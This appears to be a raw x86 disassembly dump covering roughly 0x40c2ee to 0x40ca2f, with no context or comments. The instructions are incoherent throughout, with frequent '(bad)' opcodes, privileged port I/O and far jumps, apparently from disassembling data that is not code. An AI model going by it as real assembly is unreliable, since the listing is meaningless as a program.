  40c2ee:	loopne 0x40c2f3
  40c2f0:	pop    es
  40c2f1:	dec    ebp
  40c2f2:	cmp    eax,0x5b14c717
  40c2f7:	or     ecx,0xffffffd9
  40c2fa:	push   ebx
  40c2fb:	or     BYTE PTR [eax+0x52],0x1
  40c2ff:	jb     0x40c2b2
  40c301:	scas   al,BYTE PTR es:[edi]
  40c302:	pop    ebx
  40c303:	xor    BYTE PTR [edi],ah
  40c305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c306:	adc    dl,BYTE PTR [ebp-0x9]
  40c309:	call   0x2d75:0x8bc4cf9
  40c310:	sar    ah,1
  40c312:	test   DWORD PTR [edi+0x24],0xe6e641c
  40c319:	mov    bl,0xd
  40c31b:	sbb    DWORD PTR [esi+0x616299b7],eax
  40c321:	xchg   DWORD PTR [esi+ebx*8+0x1a158d7d],ebx
  40c328:	aad    0x7c
  40c32a:	ss dec eax
  40c32c:	pusha  
  40c32d:	jb     0x40c31e
  40c32f:	cmp    esp,DWORD PTR [eax]
  40c331:	cld    
  40c332:	cmp    dh,cl
  40c334:	pop    ss
  40c335:	mov    al,ds:0x608e13ec
  40c33a:	cmp    BYTE PTR ds:0xcb85fe27,bh
  40c340:	adc    al,0x6d
  40c342:	add    edi,ebp
  40c344:	mov    dh,0xa7
  40c346:	scas   al,BYTE PTR es:[edi]
  40c347:	inc    ebx
  40c348:	lea    ebx,[edx+esi*8-0x3f]
  40c34c:	and    eax,eax
  40c34e:	dec    esp
  40c34f:	stc    
  40c350:	push   esp
  40c351:	lds    ebx,FWORD PTR [esi]
  40c353:	pop    esp
  40c354:	sub    al,0x3c
  40c356:	inc    ebx
  40c357:	and    esp,DWORD PTR [edx-0x4b10798b]
  40c35d:	push   edi
  40c35e:	je     0x40c362
  40c360:	jnp    0x40c39e
  40c362:	jle    0x40c2f8
  40c364:	add    DWORD PTR [esi+0x7e],esi
  40c367:	inc    ebp
  40c368:	sub    bl,cl
  40c36a:	jns    0x40c2f9
  40c36c:	fsubr  QWORD PTR [edx+0x501b38f2]
  40c372:	out    dx,al
  40c373:	and    al,0x5a
  40c375:	inc    esp
  40c376:	mov    bh,0xdb
  40c378:	jno    0x40c320
  40c37a:	xchg   edx,eax
  40c37b:	mov    edi,0x8a6b7103
  40c380:	sahf   
  40c381:	imul   esp,DWORD PTR [eax+0x6b],0xfffffff3
  40c385:	sub    DWORD PTR [ebx-0x71],ebp
  40c388:	inc    eax
  40c389:	repnz lea esi,[eax+ecx*8]
  40c38d:	jo     0x40c409
  40c38f:	pushf  
  40c390:	jns    0x40c411
  40c392:	sbb    ebp,edi
  40c394:	push   0x283fbe86
  40c399:	cmp    ch,BYTE PTR [ecx+ebx*1+0x3b802fd9]
  40c3a0:	mov    bl,0x78
  40c3a2:	movlps xmm6,QWORD PTR [ebx-0x557e116d]
  40c3a9:	stos   DWORD PTR es:[edi],eax
  40c3aa:	cmp    eax,DWORD PTR [ebx]
  40c3ac:	ins    DWORD PTR es:[edi],dx
  40c3ad:	add    ah,ch
  40c3af:	aaa    
  40c3b0:	gs cmp ah,ch
  40c3b3:	push   eax
  40c3b4:	sbb    ah,BYTE PTR [ebp-0x5110fd2c]
  40c3ba:	add    BYTE PTR [ecx],0x15
  40c3bd:	jb     0x40c3ba
  40c3bf:	xor    cl,bh
  40c3c1:	jnp    0x40c370
  40c3c3:	mov    ds:0x24c451ac,eax
  40c3c8:	retf   0x797e
  40c3cb:	adc    edx,edx
  40c3cd:	pop    edx
  40c3ce:	ret    0xa34c
  40c3d1:	push   ds
  40c3d2:	test   bl,ah
  40c3d4:	xchg   esi,eax
  40c3d5:	ret    
  40c3d6:	and    esi,DWORD PTR [ebx]
  40c3d8:	rcl    DWORD PTR [edx+ebx*8],0xf0
  40c3dc:	cs push esp
  40c3de:	jp     0x40c36e
  40c3e0:	cmp    al,0xcf
  40c3e2:	mov    dh,0xf0
  40c3e4:	mov    DWORD PTR [esi-0x3c],edx
  40c3e7:	or     esi,ecx
  40c3e9:	out    0xae,eax
  40c3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ec:	jecxz  0x40c3a4
  40c3ee:	scas   eax,DWORD PTR es:[edi]
  40c3ef:	xchg   edx,eax
  40c3f0:	push   edi
  40c3f1:	imul   ecx,DWORD PTR [ecx],0x4f
  40c3f4:	sub    al,0xd3
  40c3f6:	mov    edi,?
  40c3f8:	xchg   esi,eax
  40c3f9:	xor    al,0x68
  40c3fb:	loope  0x40c3ee
  40c3fd:	dec    edi
  40c3fe:	jno    0x40c41f
  40c400:	pop    ss
  40c401:	inc    eax
  40c402:	sub    al,0x85
  40c404:	mov    bl,0x0
  40c406:	pop    edi
  40c407:	or     eax,0x876aec5c
  40c40c:	fiadd  DWORD PTR [ecx]
  40c40e:	and    al,0x78
  40c410:	xchg   ebx,eax
  40c411:	adc    al,0x77
  40c413:	je     0x40c438
  40c415:	fsubr  DWORD PTR [ebp-0x40fa1e2b]
  40c41b:	push   ds
  40c41c:	push   esi
  40c41d:	sbb    eax,ebx
  40c41f:	mov    ebp,0x2afcdba
  40c424:	add    eax,0x5b055e5
  40c429:	sbb    eax,0x47f1b730
  40c42e:	arpl   WORD PTR [ebp-0x4e],bx
  40c431:	outs   dx,BYTE PTR ds:[esi]
  40c432:	adc    esp,DWORD PTR [esi-0x4a82005c]
  40c438:	mov    BYTE PTR [ecx+0x3301937e],al
  40c43e:	and    BYTE PTR [esi-0x1f],0x9d
  40c442:	lods   eax,DWORD PTR ds:[esi]
  40c443:	xchg   ebp,eax
  40c444:	dec    esi
  40c445:	aaa    
  40c446:	xchg   ecx,eax
  40c447:	stos   DWORD PTR es:[edi],eax
  40c448:	xor    BYTE PTR ds:0x1735beac,cl
  40c44e:	in     al,0xce
  40c450:	cmp    al,0x5c
  40c452:	jbe    0x40c42f
  40c454:	clc    
  40c455:	push   edi
  40c456:	and    dh,0xe
  40c459:	mov    ds:0xabfeef60,al
  40c45e:	rcr    BYTE PTR [esi+0x10],1
  40c461:	repnz sub DWORD PTR ds:0x73574cf9,ebx
  40c468:	out    dx,al
  40c469:	sub    BYTE PTR [edi+0x3e],dl
  40c46c:	and    bh,bh
  40c46e:	and    edx,0x47b14a66
  40c474:	(bad)  
  40c475:	cmp    DWORD PTR [eax+0x38],edi
  40c478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c479:	pop    esi
  40c47a:	jmp    0x4594:0x27bee9ad
  40c481:	cmp    cl,bl
  40c483:	mov    BYTE PTR [edx+0x399d304],0xaf
  40c48a:	jo     0x40c446
  40c48c:	(bad)  
  40c48d:	push   edi
  40c48e:	xor    eax,0xf2103dd9
  40c493:	add    DWORD PTR [ebx],ebx
  40c495:	retf   0xf0fb
  40c498:	ret    
  40c499:	add    ah,BYTE PTR [ebx]
  40c49b:	in     al,dx
  40c49c:	icebp  
  40c49d:	xchg   ecx,eax
  40c49e:	ins    DWORD PTR es:[edi],dx
  40c49f:	(bad)  
  40c4a1:	loopne 0x40c50c
  40c4a3:	pop    ds
  40c4a4:	adc    eax,0x8ebb7ef6
  40c4a9:	add    al,0x1b
  40c4ab:	ss lahf 
  40c4ad:	xchg   ch,dl
  40c4af:	pop    esp
  40c4b0:	mov    ch,0x92
  40c4b2:	xchg   ecx,eax
  40c4b3:	jo     0x40c4ee
  40c4b5:	dec    ebp
  40c4b6:	in     eax,0x15
  40c4b8:	adc    al,0xee
  40c4ba:	pop    esi
  40c4bb:	xor    edx,DWORD PTR [esi-0x34]
  40c4be:	mov    esp,0xd5bc480f
  40c4c3:	pusha  
  40c4c4:	dec    esp
  40c4c5:	or     eax,0xec0ba393
  40c4ca:	xor    eax,0x9f35c6e8
  40c4cf:	sti    
  40c4d0:	cmp    eax,0xc0ddf2f3
  40c4d5:	jns    0x40c548
  40c4d7:	cli    
  40c4d8:	loope  0x40c53b
  40c4da:	add    BYTE PTR [edx],bh
  40c4dc:	jmp    0x2996af9b
  40c4e1:	(bad)  
  40c4e2:	call   0x3ef5:0xe74f5b5d
  40c4e9:	or     al,dh
  40c4eb:	jle    0x40c470
  40c4ed:	jmp    FWORD PTR [edi]
  40c4ef:	cli    
  40c4f0:	mov    al,0xe3
  40c4f2:	mov    al,0x84
  40c4f4:	jb     0x40c495
  40c4f6:	mov    eax,ds:0x1db64011
  40c4fb:	mov    ds:0x32c0708c,al
  40c500:	jp     0x40c489
  40c502:	add    bh,BYTE PTR [eax+edi*8-0x4ab984bc]
  40c509:	cmp    DWORD PTR [edx-0x11],0xd3eb412c
  40c510:	mov    edx,DWORD PTR ds:0x84f6e4d0
  40c516:	cmp    BYTE PTR [esi-0x76],0x25
  40c51a:	xor    bl,BYTE PTR [ebp-0x4e]
  40c51d:	call   0xd9ad555c
  40c522:	jne    0x40c4fc
  40c524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c525:	pop    eax
  40c526:	inc    ebx
  40c527:	add    al,0x28
  40c529:	(bad)  
  40c52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c52b:	and    al,0x56
  40c52d:	jbe    0x40c534
  40c52f:	inc    esp
  40c530:	sbb    DWORD PTR [eax+0x6c],eax
  40c533:	add    BYTE PTR [esi+0x23],dl
  40c536:	out    0x12,eax
  40c538:	jge    0x40c514
  40c53a:	rol    BYTE PTR [ecx],0x64
  40c53d:	inc    ebx
  40c53e:	mov    ds:0xe47a06dd,eax
  40c543:	out    0x97,al
  40c545:	jl     0x40c543
  40c547:	test   DWORD PTR [esp+ebp*2+0x7b3d7ad4],ecx
  40c54e:	ja     0x40c50c
  40c550:	dec    eax
  40c551:	fdiv   DWORD PTR [eax-0xaea96c3]
  40c557:	ds retf 
  40c559:	push   ds
  40c55a:	jae    0x40c4fc
  40c55c:	pop    edi
  40c55d:	adc    BYTE PTR [edx],bl
  40c55f:	or     cl,BYTE PTR [ecx+0xc]
  40c562:	pop    es
  40c563:	cmovne ecx,DWORD PTR [eax-0x30fbff17]
  40c56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c56b:	jns    0x40c5cd
  40c56d:	scas   al,BYTE PTR es:[edi]
  40c56e:	mov    al,ds:0x97993fb4
  40c573:	jge    0x40c539
  40c575:	int    0x3d
  40c577:	loop   0x40c5e4
  40c579:	jp     0x40c532
  40c57b:	jmp    DWORD PTR [edx+0x4e]
  40c57e:	xchg   edx,eax
  40c57f:	por    mm3,QWORD PTR [esi+esi*2]
  40c583:	or     eax,0x8da2eaa9
  40c588:	arpl   WORD PTR ds:0xe9380021,di
  40c58e:	push   esi
  40c58f:	inc    esi
  40c590:	vmulpd xmm6,xmm4,XMMWORD PTR [edi-0x4c]
  40c595:	pop    ds
  40c596:	mov    dl,0x13
  40c598:	add    BYTE PTR [edi+0x4b5573ce],cl
  40c59e:	aas    
  40c59f:	mov    ah,0x5
  40c5a1:	sub    eax,DWORD PTR [edx+ecx*2-0x37]
  40c5a5:	pop    es
  40c5a6:	stos   DWORD PTR es:[edi],eax
  40c5a7:	icebp  
  40c5a8:	xchg   DWORD PTR [ecx-0x6788fd77],edx
  40c5ae:	nop    DWORD PTR [esi+0x60723628]
  40c5b5:	ja     0x40c583
  40c5b7:	push   edx
  40c5b9:	fcom   st(0)
  40c5bb:	push   esi
  40c5bc:	push   edx
  40c5bd:	dec    esi
  40c5be:	jmp    0x40c5de
  40c5c0:	adc    bh,BYTE PTR [edi]
  40c5c2:	mov    esp,ebx
  40c5c4:	(bad)  
  40c5c5:	lods   al,BYTE PTR ds:[esi]
  40c5c6:	pop    ds
  40c5c7:	mov    ds:0x302eea79,eax
  40c5cc:	jnp    0x40c633
  40c5ce:	or     dl,BYTE PTR [eax+0x60]
  40c5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d2:	cmp    DWORD PTR [edx],0xfffffff1
  40c5d5:	push   0xe2e6e597
  40c5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5db:	jl     0x40c566
  40c5dd:	inc    ecx
  40c5de:	push   es
  40c5df:	cmp    BYTE PTR [si-0x42],ch
  40c5e3:	add    BYTE PTR [edx-0x229fa9dc],cl
  40c5e9:	lods   al,BYTE PTR ds:[esi]
  40c5ea:	push   ebp
  40c5eb:	mov    ah,0xbd
  40c5ed:	scas   eax,DWORD PTR es:[edi]
  40c5ee:	(bad)  
  40c5f0:	or     esp,DWORD PTR [esi+0x76]
  40c5f3:	pusha  
  40c5f4:	or     eax,0xb2df9874
  40c5f9:	jno    0x40c675
  40c5fb:	test   BYTE PTR [esi],ah
  40c5fd:	pop    ss
  40c5fe:	seta   ah
  40c601:	test   BYTE PTR [ecx-0x6ddfc081],0x93
  40c608:	mov    esi,0x334ef87a
  40c60d:	js     0x40c615
  40c60f:	or     al,0xa7
  40c611:	jae    0x40c5f8
  40c613:	push   0x41
  40c615:	imul   ecx,ebp,0xe
  40c618:	pusha  
  40c619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c61a:	inc    esp
  40c61b:	dec    esp
  40c61c:	pop    ecx
  40c61d:	mov    ebp,es
  40c61f:	fs pop ebp
  40c621:	jl     0x40c675
  40c623:	mov    ah,0x9a
  40c625:	leave  
  40c626:	mov    ebp,0x7bd824c
  40c62b:	ss sbb ah,ah
  40c62e:	xchg   BYTE PTR [esi+0x7e360260],al
  40c634:	cmp    al,0x9a
  40c636:	mov    ebx,DWORD PTR [eax-0x6f]
  40c639:	push   esi
  40c63a:	xlat   BYTE PTR ds:[ebx]
  40c63b:	ds shl bh,1
  40c63e:	aas    
  40c63f:	out    0x6c,eax
  40c641:	push   ss
  40c642:	or     ebp,DWORD PTR [eax+0x69]
  40c645:	jge    0x40c60f
  40c647:	jmp    0x67a9:0xeabd6882
  40c64e:	adc    bh,BYTE PTR [ebx]
  40c650:	sti    
  40c651:	sub    ah,al
  40c653:	pop    ecx
  40c654:	sahf   
  40c655:	dec    ecx
  40c656:	ds push 0xfca57458
  40c65c:	(bad)  
  40c65d:	push   ebp
  40c65e:	fsubr  DWORD PTR [ebp+edx*2-0x4b]
  40c662:	pop    edi
  40c663:	mov    al,ch
  40c665:	pushf  
  40c666:	cmc    
  40c667:	and    ebx,DWORD PTR [ecx]
  40c669:	cwde   
  40c66a:	rcr    DWORD PTR [ebp+0x959b4f],cl
  40c670:	mov    BYTE PTR [edi+ebp*4],bh
  40c673:	cwde   
  40c674:	dec    ebp
  40c675:	mov    WORD PTR [eax],ds
  40c677:	jns    0x40c69e
  40c679:	ds out dx,al
  40c67b:	or     eax,0x3cc44939
  40c680:	xor    dh,dh
  40c682:	pop    ebp
  40c683:	shl    BYTE PTR [edi+0x6e899aea],0x55
  40c68a:	jmp    0xb91cac
  40c68f:	jecxz  0x40c6b2
  40c691:	mov    ds:0xf084d6b,al
  40c696:	jmp    0xff8de6cc
  40c69b:	lock inc edi
  40c69d:	sub    ecx,DWORD PTR [ebx+0x5fd68430]
  40c6a3:	(bad)  
  40c6a4:	aam    0xa3
  40c6a6:	dec    esi
  40c6a7:	or     ah,al
  40c6a9:	lods   al,BYTE PTR ds:[esi]
  40c6aa:	pop    ebx
  40c6ab:	push   cs
  40c6ac:	ss (bad) 
  40c6ae:	lea    esi,[edx+edi*1-0x16]
  40c6b2:	std    
  40c6b3:	xlat   BYTE PTR ds:[ebx]
  40c6b4:	or     ah,BYTE PTR [ebx]
  40c6b6:	lods   eax,DWORD PTR ds:[esi]
  40c6b7:	push   edx
  40c6b8:	ror    BYTE PTR [edx],cl
  40c6ba:	stos   DWORD PTR es:[edi],eax
  40c6bb:	cmp    DWORD PTR [edi-0x30],ebp
  40c6be:	xor    al,0x92
  40c6c0:	dec    esi
  40c6c1:	mov    eax,ds:0xb7fa5e5f
  40c6c6:	pop    ss
  40c6c7:	scas   eax,DWORD PTR es:[edi]
  40c6c8:	mov    ds:0x7300f7e5,eax
  40c6cd:	mov    al,0x60
  40c6cf:	mov    ds:0xf31b02e1,al
  40c6d4:	or     DWORD PTR [ebp+0x5b526b22],esi
  40c6da:	pop    es
  40c6db:	shl    DWORD PTR [ecx],1
  40c6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6de:	jne    0x40c716
  40c6e0:	and    esp,esi
  40c6e2:	mov    dh,ah
  40c6e4:	and    ebx,eax
  40c6e6:	loope  0x40c725
  40c6e8:	mov    ch,0xe9
  40c6ea:	or     edx,DWORD PTR [ecx+0x1ede6a19]
  40c6f0:	ins    BYTE PTR es:[edi],dx
  40c6f1:	mov    edi,0x42e1e251
  40c6f6:	scas   eax,DWORD PTR es:[edi]
  40c6f7:	jmp    0x2e388b2f
  40c6fc:	in     eax,0xb6
  40c6fe:	in     al,dx
  40c6ff:	jo     0x40c6e6
  40c701:	fadd   DWORD PTR [ebp+0x58df2189]
  40c707:	popa   
  40c708:	not    BYTE PTR ds:0xaaff1267
  40c70e:	repnz test DWORD PTR [edx],edi
  40c711:	sub    ecx,ebx
  40c713:	add    BYTE PTR [ecx],cl
  40c715:	mov    al,0xfc
  40c717:	jecxz  0x40c715
  40c719:	rol    DWORD PTR [eax+0x50],1
  40c71c:	push   ds
  40c71d:	pop    ss
  40c71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c71f:	mov    bh,0x7e
  40c721:	mov    esp,ss
  40c723:	data16 mov ah,0xaf
  40c726:	fimul  DWORD PTR ds:0xa78efff8
  40c72c:	push   es
  40c72d:	xor    dh,BYTE PTR [edx-0x75a3f2a2]
  40c733:	rcl    DWORD PTR [bx-0x33],cl
  40c737:	fwait
  40c738:	mov    dl,0x98
  40c73a:	xchg   ecx,eax
  40c73b:	stc    
  40c73c:	sub    esp,edx
  40c73e:	and    edi,0x1d
  40c741:	shl    DWORD PTR [esi+0x15],cl
  40c744:	(bad)  
  40c745:	inc    ebp
  40c747:	mov    DWORD PTR [esi+0x12cc89a8],ebp
  40c74d:	clc    
  40c74e:	dec    ecx
  40c74f:	fs pop ds
  40c751:	jo     0x40c755
  40c753:	push   eax
  40c754:	loope  0x40c713
  40c756:	retf   
  40c757:	sub    DWORD PTR [esp+edi*1+0x42],esi
  40c75b:	call   0x9e6c090c
  40c760:	int    0x55
  40c762:	cmp    eax,0xeeb0ae11
  40c767:	xchg   edi,eax
  40c768:	or     DWORD PTR [edx],eax
  40c76a:	xor    DWORD PTR [ebx],esi
  40c76c:	xchg   ebx,eax
  40c76d:	adc    al,0x4c
  40c76f:	out    0x3a,al
  40c771:	jl     0x40c75b
  40c773:	jmp    0x707c0cbe
  40c778:	rcl    DWORD PTR [edx-0x12],1
  40c77b:	push   cs
  40c77c:	cli    
  40c77d:	addr16 cdq 
  40c77f:	imul   ecx,DWORD PTR [ebx+0x6f],0x39
  40c783:	mov    dl,0xbe
  40c785:	mov    esi,0xfe8a67fb
  40c78a:	ja     0x40c7fa
  40c78c:	loop   0x40c768
  40c78e:	jns    0x40c7ee
  40c790:	stos   BYTE PTR es:[edi],al
  40c791:	cs aas 
  40c793:	mov    edi,0x43a3f8eb
  40c798:	jecxz  0x40c72b
  40c79a:	into   
  40c79b:	mov    bl,0x6b
  40c79d:	jo     0x40c7e0
  40c79f:	(bad)  [ecx+0x35]
  40c7a2:	xchg   ebx,eax
  40c7a3:	pushf  
  40c7a4:	stos   BYTE PTR es:[edi],al
  40c7a5:	enter  0x97d1,0x96
  40c7a9:	out    0x81,al
  40c7ab:	xchg   esp,eax
  40c7ac:	sbb    edi,esp
  40c7ae:	jb     0x40c76a
  40c7b0:	mov    ah,0x4e
  40c7b2:	pop    ebp
  40c7b3:	dec    ebp
  40c7b4:	sub    bl,BYTE PTR ds:[edi+0x62d1b62e]
  40c7bb:	xor    eax,0x9f2ecabb
  40c7c0:	mov    dl,0xa8
  40c7c2:	or     al,BYTE PTR [edi-0x41e624fd]
  40c7c8:	xor    eax,0x4e15984c
  40c7cd:	push   es
  40c7ce:	fdivr  st,st(7)
  40c7d0:	or     eax,DWORD PTR [edx]
  40c7d2:	jle    0x40c792
  40c7d4:	sub    eax,0x1e7f9e10
  40c7d9:	cmp    ebp,edi
  40c7db:	sti    
  40c7dc:	jmp    0x40c775
  40c7de:	pop    ss
  40c7df:	dec    edi
  40c7e0:	loopne 0x40c76b
  40c7e2:	dec    ebx
  40c7e3:	(bad)  [edx]
  40c7e5:	(bad)  
  40c7e6:	in     al,0xd3
  40c7e8:	mov    ebp,0x1f289968
  40c7ed:	cmp    al,BYTE PTR [ecx-0x4c8b1da0]
  40c7f3:	mov    ecx,0xb5192121
  40c7f8:	outs   dx,BYTE PTR ds:[esi]
  40c7f9:	pop    eax
  40c7fa:	push   edi
  40c7fb:	pop    es
  40c7fc:	inc    esi
  40c7fd:	lds    edx,FWORD PTR [edi-0x6072c8eb]
  40c803:	loope  0x40c80a
  40c805:	push   0xd71a012e
  40c80a:	sub    eax,0x9879a42f
  40c80f:	(bad)  
  40c812:	in     eax,0xaf
  40c814:	push   esi
  40c815:	jnp    0x40c86d
  40c817:	outs   dx,DWORD PTR ds:[esi]
  40c818:	mov    dh,0xad
  40c81a:	pop    ecx
  40c81b:	adc    BYTE PTR [edi+0x33],0xc0
  40c81f:	fld    TBYTE PTR [eax-0x25804f99]
  40c825:	dec    ebp
  40c826:	mov    ch,cl
  40c828:	imul   esi,DWORD PTR [ecx+0x52710d8],0x152e7164
  40c832:	fs inc eax
  40c834:	sbb    dl,BYTE PTR [ebp-0x1e560060]
  40c83a:	inc    ebp
  40c83b:	mov    ebp,0x38e4cf8e
  40c840:	push   ss
  40c841:	dec    edx
  40c842:	pusha  
  40c843:	mov    WORD PTR [esi-0xfc2df49],ds
  40c849:	jle    0x40c7fc
  40c84b:	imul   edx,ebp,0x3576fcb1
  40c851:	mov    esp,0x9e4ad30
  40c856:	xor    esp,DWORD PTR [ebx+ebx*4]
  40c859:	nop
  40c85a:	fwait
  40c85b:	int    0xe1
  40c85d:	pop    ebx
  40c85e:	mov    esp,0xa283ffc4
  40c863:	mov    edx,0xbdbdee38
  40c868:	mov    cl,0x62
  40c86a:	xchg   ecx,eax
  40c86b:	push   edi
  40c86c:	sub    DWORD PTR [edx+0x71],edi
  40c86f:	stos   DWORD PTR es:[edi],eax
  40c870:	dec    ebx
  40c871:	outs   dx,BYTE PTR ds:[esi]
  40c872:	push   ds
  40c873:	daa    
  40c874:	inc    esi
  40c875:	jb     0x40c824
  40c877:	push   eax
  40c878:	add    al,0x53
  40c87a:	sahf   
  40c87b:	fwait
  40c87c:	or     DWORD PTR [esi*2+0x1bc7e830],0xffffffb0
  40c884:	dec    ebx
  40c885:	add    DWORD PTR [ebx+0xa312c74],ecx
  40c88b:	in     eax,dx
  40c88c:	sbb    ebx,ecx
  40c88e:	mov    ds:0x9075c479,al
  40c893:	sbb    ecx,esp
  40c895:	mov    edi,eax
  40c897:	fld    DWORD PTR [edi]
  40c899:	dec    ebp
  40c89a:	dec    edi
  40c89b:	pusha  
  40c89c:	div    edi
  40c89e:	jl     0x40c86b
  40c8a0:	js     0x40c8c1
  40c8a2:	ins    BYTE PTR es:[edi],dx
  40c8a3:	popf   
  40c8a4:	adc    BYTE PTR [esi],dh
  40c8a6:	int3   
  40c8a7:	push   ebx
  40c8a8:	jbe    0x40c927
  40c8aa:	cmp    esp,DWORD PTR [edi+0x2b3bf660]
  40c8b0:	call   0x3ee6:0x7a6f04e3
  40c8b7:	aaa    
  40c8b8:	ret    
  40c8b9:	xor    BYTE PTR [eax-0xedb148f],bh
  40c8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8c0:	jle    0x40c887
  40c8c2:	jns    0x40c8a1
  40c8c4:	sbb    BYTE PTR [edi],ah
  40c8c6:	cli    
  40c8c7:	fadd   st,st(0)
  40c8c9:	and    eax,0x16091837
  40c8ce:	adc    eax,0x7644f5ca
  40c8d3:	push   esp
  40c8d4:	mov    esp,0x21680724
  40c8d9:	mov    ah,0xec
  40c8db:	enter  0x9183,0x60
  40c8df:	pop    ebx
  40c8e0:	or     al,0x4
  40c8e2:	cmp    esp,DWORD PTR cs:[edi+0x6d3a701f]
  40c8e9:	test   al,0xec
  40c8eb:	dec    edi
  40c8ec:	jns    0x40c8e3
  40c8ee:	cli    
  40c8ef:	aam    0x92
  40c8f1:	pop    es
  40c8f2:	ins    BYTE PTR es:[edi],dx
  40c8f3:	out    dx,al
  40c8f4:	mov    bh,BYTE PTR [edx+0x4ceaf50b]
  40c8fa:	pushf  
  40c8fb:	cmp    BYTE PTR [ebx+0x677b719f],ah
  40c901:	arpl   WORD PTR [ebx],di
  40c903:	mov    esi,0x24583ba7
  40c908:	outs   dx,BYTE PTR ds:[esi]
  40c909:	clc    
  40c90a:	mov    ?,WORD PTR [edi]
  40c90c:	inc    ebx
  40c90d:	or     bh,ch
  40c90f:	and    DWORD PTR ds:0xd477939,ecx
  40c915:	jmp    0x40c93b
  40c917:	push   ebx
  40c918:	jg     0x40c901
  40c91a:	ds jg  0x40c960
  40c91d:	or     DWORD PTR [ebx-0x212f9635],ebp
  40c923:	ja     0x40c961
  40c925:	repz jno 0x40c8f8
  40c928:	mov    eax,0xbaff022a
  40c92d:	jae    0x40c8cf
  40c92f:	xor    al,0x89
  40c931:	fwait
  40c932:	cs inc ebp
  40c934:	dec    edx
  40c935:	fisubr WORD PTR [ebp+0x6958c7d2]
  40c93b:	daa    
  40c93c:	xchg   edx,eax
  40c93d:	psraw  mm5,QWORD PTR [edi+0x75758d77]
  40c944:	mov    bl,0x52
  40c946:	xor    al,0x8f
  40c948:	sbb    cx,WORD PTR [esi+0x2b6951e7]
  40c94f:	push   edi
  40c950:	jg     0x40c90e
  40c952:	ss iret 
  40c954:	xchg   BYTE PTR [esp+esi*1],ah
  40c957:	or     BYTE PTR [ecx-0x1a17b923],0x1d
  40c95e:	push   esi
  40c95f:	and    eax,0xc3cde499
  40c964:	mov    dl,0x2e
  40c966:	rol    bl,0x37
  40c969:	dec    edi
  40c96a:	dec    BYTE PTR [esi-0x12]
  40c96d:	mov    esi,0xd217d032
  40c972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c973:	dec    ecx
  40c974:	jns    0x40c9ce
  40c976:	pop    esi
  40c977:	(bad)  
  40c978:	mov    ds:0xfe57306,al
  40c97d:	loope  0x40c9fc
  40c97f:	(bad)  
  40c980:	sbb    eax,0x10350fd2
  40c985:	popa   
  40c986:	pop    ss
  40c987:	and    BYTE PTR [eax+0x2b],dh
  40c98a:	mov    edx,0xf454d32
  40c98f:	adc    DWORD PTR [edi+0x32],ecx
  40c992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c993:	scas   al,BYTE PTR es:[edi]
  40c994:	outs   dx,DWORD PTR ds:[esi]
  40c995:	dec    eax
  40c996:	xchg   esi,eax
  40c997:	jnp    0x40ca09
  40c999:	in     eax,dx
  40c99a:	xchg   BYTE PTR [ecx],al
  40c99c:	sub    al,0x93
  40c99e:	pop    ds
  40c99f:	or     al,0x8d
  40c9a1:	fwait
  40c9a2:	js     0x40ca12
  40c9a4:	mov    bl,0x52
  40c9a6:	leave  
  40c9a7:	(bad)  
  40c9a8:	cli    
  40c9a9:	imul   ebp,esi,0x6a
  40c9ac:	and    al,0x4d
  40c9ae:	icebp  
  40c9af:	pusha  
  40c9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b1:	mov    DWORD PTR [esi-0x8],ebp
  40c9b4:	add    BYTE PTR [ebp+ecx*8-0x9],al
  40c9b8:	push   ss
  40c9b9:	mov    eax,ds:0xba0b333b
  40c9be:	(bad)  [ecx-0x26a91c42]
  40c9c4:	(bad)  
  40c9c5:	push   ds
  40c9c6:	or     DWORD PTR [edi],ebp
  40c9c8:	adc    BYTE PTR [esp+edx*1],0x8e
  40c9cc:	push   ebp
  40c9cd:	neg    BYTE PTR [ebx-0x55]
  40c9d0:	inc    edi
  40c9d1:	mov    bh,0x7c
  40c9d3:	js     0x40ca1a
  40c9d5:	dec    edx
  40c9d6:	adc    eax,0xd1f31af9
  40c9db:	repz sar BYTE PTR [esi],cl
  40c9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e1:	or     al,0xbe
  40c9e3:	clc    
  40c9e4:	repnz stos BYTE PTR es:[edi],al
  40c9e6:	aam    0x4d
  40c9e8:	or     ebx,DWORD PTR [eax+0x60e7df24]
  40c9ee:	inc    esp
  40c9ef:	leave  
  40c9f0:	pop    eax
  40c9f1:	jecxz  0x40c9a8
  40c9f3:	retf   0xf5ab
  40c9f6:	jae    0x40c9c9
  40c9f8:	fimul  WORD PTR [esi-0x8b2ed62]
  40c9fe:	xchg   edx,eax
  40c9ff:	or     edi,DWORD PTR [eax]
  40ca01:	inc    esp
  40ca02:	data16 sahf 
  40ca04:	in     eax,0x6f
  40ca06:	mov    ch,0xc3
  40ca08:	sub    esp,esp
  40ca0a:	fstp   DWORD PTR [esi+0x2637b68d]
  40ca10:	mov    cl,0xb9
  40ca12:	xchg   esp,eax
  40ca13:	call   FWORD PTR [ebx]
  40ca15:	popa   
  40ca16:	inc    esp
  40ca17:	adc    DWORD PTR [eax-0x1c34dfaf],edi
  40ca1d:	adc    eax,0x33e0ab5a
  40ca22:	pause  
  40ca24:	add    al,0xf4
  40ca26:	push   edx
  40ca27:	push   ss
  40ca28:	stos   DWORD PTR es:[edi],eax
  40ca29:	push   edi
  40ca2a:	and    BYTE PTR [esi+eax*4+0x39],cl
  40ca2e:	ret    
  40ca2f:	or     DWORD PTR [ebx],edi
